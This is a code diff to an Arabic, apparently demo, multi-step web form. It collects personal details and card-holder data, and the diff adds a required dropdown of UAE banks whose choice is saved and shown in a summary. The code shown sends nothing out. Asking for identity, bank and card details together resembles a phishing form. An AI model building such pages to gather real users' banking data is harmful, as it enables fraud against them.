@@ -27,7 +27,16 @@
     .summary .row{justify-content:space-between;padding:8px 0;border-bottom:1px dashed #eee}
     .summary .label{color:#666}
     .summary .value{font-weight:700}
-    /* responsive */
+    /* مظهر اختيار البنك كسهم داخل المربع */
+    select.bank-select{
+      appearance:none;-webkit-appearance:none;-moz-appearance:none;
+      background-image: linear-gradient(45deg, transparent 50%, #666 50%),
+                        linear-gradient(135deg, #666 50%, transparent 50%);
+      background-position: calc(1.2rem) center, calc(2rem) center;
+      background-size: 6px 6px;
+      background-repeat: no-repeat;
+      padding-left:42px;
+    }
     @media (max-width:600px){
       .wrap{padding:12px}
     }
@@ -41,11 +50,10 @@
   </header>
 
   <main class="wrap">
-    <!-- الصفحة 1: بيانات شخصية -->
+    <!-- الصفحة 1: بيانات شخصية + اختيار البنك -->
     <section id="step1" class="card">
       <h1>البيانات الشخصية</h1>
       <form id="personalForm" autocomplete="off" novalidate>
-        <input id="logoHidden" type="hidden" value="demo" />
         <label for="fullName">الاسم الكامل</label>
         <input id="fullName" type="text" placeholder="الاسم الكامل" required />
 
@@ -66,10 +74,32 @@
         <label for="phone">رقم الجوال</label>
         <input id="phone" type="tel" placeholder="05XXXXXXXX" required />
 
+        <!-- اختيار البنك داخل المربع -->
+        <label for="bank">ادخل البنك الخاص بك</label>
+        <select id="bank" class="bank-select" required>
+          <option value="">— اختر البنك —</option>
+          <option>بنك أبوظبي الأول</option>
+          <option>مصرف أبوظبي الإسلامي</option>
+          <option>بنك أبوظبي التجاري</option>
+          <option>بنك الإمارات دبي الوطني</option>
+          <option>بنك دبي الإسلامي</option>
+          <option>بنك دبي التجاري</option>
+          <option>بنك المشرق</option>
+          <option>مصرف الشارقة الإسلامي</option>
+          <option>بنك عجمان</option>
+          <option>مصرف الهلال</option>
+          <option>بنك رأس الخيمة</option>
+          <option>بنك الفجيرة الوطني</option>
+          <option>HSBC</option>
+          <option>LIV</option>
+          <option>البنك التجاري الدولي</option>
+          <option>بنك ستاندرد تشارترد</option>
+        </select>
+
         <label for="email">البريد الإلكتروني</label>
         <input id="email" type="email" placeholder="example@mail.com" required />
 
-        <div class="error" id="errStep1">الرجاء ملء كل الحقول بشكل صحيح.</div>
+        <div class="error" id="errStep1">الرجاء ملء كل الحقول بشكل صحيح بما في ذلك اختيار البنك.</div>
 
         <button id="toStep2" type="button">التالي</button>
         <p class="small">سيتم نقل بياناتك إلى صفحة الدفع التالية لأكمال العملية (تجريبي).</p>
@@ -92,7 +122,7 @@
         <input id="cardName" type="text" placeholder="اسم حامل البطاقة" />
 
         <div style="display:flex;gap:8px">
-          <div style="flex:1">
+          <div class="col">
             <label for="expiryMonth">الشهر (MM)</label>
             <select id="expiryMonth">
               <option value="">--</option>
@@ -102,7 +132,7 @@
               <option>10</option><option>11</option><option>12</option>
             </select>
           </div>
-          <div style="flex:1">
+          <div class="col">
             <label for="expiryYear">السنة (YYYY)</label>
             <select id="expiryYear">
               <option value="">--</option>
@@ -166,17 +196,18 @@
     const year = document.getElementById('year').value.trim();
     const phone = document.getElementById('phone').value.trim();
     const email = document.getElementById('email').value.trim();
+    const bank = document.getElementById('bank').value;
     const err = document.getElementById('errStep1');
 
-    // تحقق بسيط
-    if(!fullName || !idType || !day || !month || !year || !phone || !email){
+    // تحقق بسيط بما في ذلك البنك
+    if(!fullName || !idType || !day || !month || !year || !phone || !email || !bank){
       err.style.display = 'block';
       return;
     }
     err.style.display = 'none';
 
     // خزّن بيانات غير حسّاسة في sessionStorage للعرض لاحقًا
-    const pData = { fullName, idType, birth: `${day}/${month}/${year}`, phone, email };
+    const pData = { fullName, idType, birth: `${day}/${month}/${year}`, phone, email, bank };
     sessionStorage.setItem('personalData', JSON.stringify(pData));
 
     // انتقل للخطوة 2
@@ -235,6 +266,7 @@
       <div class="row"><div class="label">الاسم</div><div class="value">${escapeHtml(personal.fullName||'-')}</div></div>
       <div class="row"><div class="label">الهاتف</div><div class="value">${escapeHtml(personal.phone||'-')}</div></div>
       <div class="row"><div class="label">البريد</div><div class="value">${escapeHtml(personal.email||'-')}</div></div>
+      <div class="row"><div class="label">البنك المختار</div><div class="value">${escapeHtml(personal.bank||'-')}</div></div>
       <div class="row"><div class="label">رقم الحجز</div><div class="value">${escapeHtml(safePayment.confirmBooking||'-')}</div></div>
       <div class="row"><div class="label">اسم على البطاقة</div><div class="value">${escapeHtml(safePayment.cardHolderName||'-')}</div></div>
       <div class="row"><div class="label">تاريخ الانتهاء</div><div class="value">${escapeHtml(safePayment.expiry||'-')}</div></div>
@@ -246,21 +278,17 @@
     window.scrollTo(0,0);
   });
 
-  // تعديل: العودة للصفحة الأولى
+  // تعديل: الرجوع لتعديل البطاقة
   document.getElementById('editBack').addEventListener('click', function(){
-    // يمكن العودة للخطوة 1 أو 2 بحسب رغبتك - سأعد العودة للخطوة 2 لتعديل تفاصيل البطاقة
     step3.classList.add('hidden');
     step2.classList.remove('hidden');
     window.scrollTo(0,0);
   });
 
-  // متابعة نهائية: هنا نفترض تحويل المستخدم إلى بوابة خارجية أو صفحة نجاح (تجريبي)
+  // متابعة نهائية: تحويل/نجاح تجريبي
   document.getElementById('finalContinue').addEventListener('click', function(){
-    // تنظيف بيانات الجلسة التجريبية
     sessionStorage.removeItem('personalData');
     sessionStorage.removeItem('paymentSafeData');
-
-    // تحويل تجريبي لصفحة نجاح داخل نفس الملف (عرض رسالة)
     showSuccess();
   });
 
